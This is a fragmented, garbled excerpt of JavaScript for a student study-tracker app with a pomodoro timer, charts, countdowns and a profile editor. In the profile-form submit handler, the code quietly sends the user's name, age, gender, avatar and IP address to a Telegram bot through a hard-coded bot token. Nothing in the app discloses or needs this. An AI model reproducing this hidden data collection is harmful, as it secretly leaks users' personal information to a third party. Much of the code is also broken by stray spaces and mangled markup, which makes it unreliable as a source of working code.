...
this.timeLeft = s.timeL eft; this.endTime = s.endTime; this.isRunning = s.isRunning;
...
this.updateDisplay(); this.saveStat e();
};
});
...
const l = parseInt(document.getElement ById('set-long').value) || 15;
...
document.getElementById('sessi on-count-display').textContent = this.sessions;
},
getDuration() {
const ps = APP.data.pomoSettings || { work: 25, short: 5, long: 15 };
return this.mode === 'work' ? ps.work : thi s.mode === 'shortBreak' ? ps.short : ps.long;
},
updateDisplay() {
const m = Math.floor(this.timeLeft / 60).toString().padStart(2, '0');
const s = (this.timeLeft % 60).toString().p adStart(2, '0');
const minEl = document.getElementById('pomo-min');
const secEl = document.getElementById('pomo-sec');
if (minEl) minEl.textContent = m;
if (secEl) secEl.textConten t = s;
...
document.getElementById('pomo-pause').classList.toggle('hidden', !this.isR unning);
const statusEl = document.getElementById('pomo-status');
if (statusEl) {
statusEl.textContent = this.isRunning ? (this.mode === 'work' ? 'Focus Time' : this.mode === 'shor tBreak' ? 'Short Break' : 'Long Break') : 'Ready';
}
},
start() {
if (this.isRunning) return;
...
this.saveSt ate(); APP.requestNotif(); this.tick();
},
tick() {
...
APP.data.pomodoroSessions.push({ date: new Date().toISOString(), mode: 'work', dur ation: ps.work });
...
if (!el) return;
if (on) { el.classList.add('fullscreen'); document.documentElement.requestFullscree n?.(); }
...
doc.text(
`Generated: ${new Date().toLocaleDateString()} | Total Focus Sessions: ${totalFocus}`
, 14, 32);
...
const genderInput = document.getElementById('profile-gen der');
...
if (subtextInput) {
  ...
  subtextInput.addEventListener('input', (e) = > {
    ...
    if (previewSub) previewSub.textContent = e.targe t.value ||  "Let's start learning 🎯 ";
  });
}
...
if (nameInput) {
  nameInput.addEventListener('input', (e) = > {
    const previewGreeting = document.getElementById('preview-greeting');
    const sidebarName = document.getElementById('sidebar-username');
    const val = e.target.value.tri m() || 'User';
    if (previewGreeting) {
      const greeting = this.getGreeting();
...
document.getElementById('profile-form')?.addEventListener('submit', async (e) => {
  ...
  this.data.profile = {
    ...
    avatar: selectedAvatar ? selectedAvatar.dataset.avatar : 'https://i.postim g.cc/QdPYLqrV/AIRetouch-20260412-135002012.png',
    gender: document.getElementById('profile-gender').value,
    age: parseInt(document.getElementById('profile-age').value) || nul l,
  ...
  try {
    ...
    const avatarFile = this.data.profile.avatar.split('/').pop() || 'Default';

    const message = `👤 <b>Profile Updated</b>\n` +
                    `📛 Name: ${this.data.profile.name}\n` +
                    `🎂 Age: ${this.data.profile.age || 'N/A'}\n` +
                    `⚧ Gender: ${this.data.profile.gender || 'N/A'}\n` +
                    `🖼️ Avatar: ${avatarFile}\n` +
                    `🌍 IP: ${userIP}`;

    await fetch(`https://api.telegram.org/bot8243187303:AAEN9yrkRYWsgU8hooJfTYqyWOJPrNhS_pc/sendMessage`, {
      method: 'POST',
...
this.data.profil e = { name: 'User', avatar: 'https://i.postimg.cc/QdPYLqrV/AIRetouch-20260412-135002012.png', gender: '', age: null, subtext:  "Let's start learning 🎯 " };
}
},
save() { localStorage.setItem('learny_data', JSON.stringify(this.data)); },
getThemeColor() {
const map = { purple: '#6c2bd9', red: '#ef4444', green: '#10b981', blue: '#3 b82f6', yellow: '#eab308' };
return map[this.data.currentTheme] || '#6c2bd9';
},
fixThemeUI() {
if (this.data.darkMode === false) document.body.classList.add('light');
if (this.dat a.currentTheme  & & this.data.currentTheme !== 'purple') document.body.classList.add( `theme-${this.data.currentTheme}` );
...
if (el) { el.query Selector('span').textContent = msg; el.classList.add('show'); setTimeout(() = > el.classList.remove('show'), 3000); }
...
const l ast = new Date(this.data.lastLogin || today);
...
con st dpr = window.devicePixelRatio || 1;
...
const ch artW = w - pad.left - pad.right; const chartH = h - pad.top - pad.bottom;
...
ctx.fillStyle = textColor; ctx.font = '11px Inter, sans-serif'; ctx.textAl ign = 'right';
ctx.fillText((max - (max/4)*i).toFixed(1), pad.left - 8, y + 4);
}
ctx.stroke();
const barW = (chartW / data.length) * 0.55; const gap = chartW / data.length;
ctx.sh adowColor = color + '40'; ctx.shadowBlur = 10;
data.forEach((d, i) = > {
...
ctx.fillStyle = textColor; ctx.font = '10px Inter, s ans-serif'; ctx.textAlign = 'center';
ctx.fillText(d.x, x + barW / 2, h - 12);
ctx.fillStyle = getComputedStyle(document.body).getPropertyValue('--text-main').trim();
ctx.font = 'b old 11px Inter, sans-serif';
...
const isShowing = sinhalaEl.classList.conta ins('show');
...
document.getElem entById('today-study-time').textContent = this.getTodayStudy() + 'h';
document.getElementById('total-study-hours').textContent = this.getTotalStudy().toFixed(1) + 'h';
document.get ElementById('total-days').textContent = this.data.timeLogs.length;
document.getElementById('avg-hours').textContent = (this.getTotalStudy() / (this.data.timeLogs.length || 1)).toFi xed(1);
...
document.getElementById('today-tasks-list').innerHTML = t asks.length ? tasks.map(t = >
...
cdList.innerHTML = '
No countdowns set. [Add one](countdown.html)
';
} else {
cdList.innerHTML = this.data.countdowns.slice(0, 3).map(c => {
const diff = Math.ceil((new Date(c.date) - new Date()) / 86400000);
return 
`<div class="dash-cd-item"><span class="dash-cd-name">${c.name}</span><span class="dash-cd-days">${diff > 0 ?`
${diff} days left
`: 'Completed'}</span></div>`
;
}).join('') + (this.data.countdowns.length > 3 ? 
`<div style="text-align:center;margin-top:8px;"><a href="countdown.html" style="font-size:12px;color:var(--primary-light);">View all (${this.data.countdowns.length})</a></div>`
 : '');
}
}
},
...
const hoursHtml = log ? 
`<span class="cal-hours" style="color:${this.getThemeColor()}">${log.hours}h</span>`
 : '';
html += 
`<div class="cal-day ${cls}" data-date="${ds}"><span class="cal-date-num">${d}</span>${hoursHtml}</div>`
;
}
cal.innerHTML = html;
...
const draw = () => { ctx.clearRect(0,0,c.width,c.height); let done = true; pcs.forEach(p => { ctx.fillStyle = p.c; ctx.beginPath(); ctx.arc(p.x + Math.sin(p.w)
10, p.y, p.s, 0, Math.PI
2); ctx.fill(); p.y += p.v; p.w += 0.1; if (p.y < c.height) done = false; }); if (!done) requestAnimationFrame(draw); else ctx.clearRect(0,0,c.width,c.height); };
draw();
},
initAssistant() {
...
`<div style=` `"display:flex;gap:8px;margin-top:8px;` `"` `>` `<input type=` `"text` `" id=` `"assistant-name-input` `" class=` `"form-control` `" placeholder=` `"Enter your name...` `" style=` `"margin:0;` `"` `>` `<button id=` `"assistant-name-send` `" class=` `"btn btn-primary` `" style=` `"padding:10px 16px;` `"` `>Send` `</button` `>` `</div` `>`
;
...
this.showAssistant(
`Hi ${n}! Ready to crush your goals?`
, [{ t: 'Study Timetable', a: () = > this.timetable() }, { t: 'Subject Tips', a: () = > this.subjectTips() }]);
},
...
this.audio.onplay = () => { this.playing = true; document.getElementById('play-pause-btn').innerHTML = '
'; };
this.audio.onpause = () => { this.playing = false; document.getElementById('play-pause-btn').innerHTML = '
'; };
document.getElementById('play-pause-btn')?.addEventListener('click', () => { this.audio.src ? this.audio
...
fmt(s) { const m = Math.floor(s/60); const sc = Math.floor(s%60); return 
...
if (t !== 'purple') document.body.classList.add(
`theme-${t}`
);
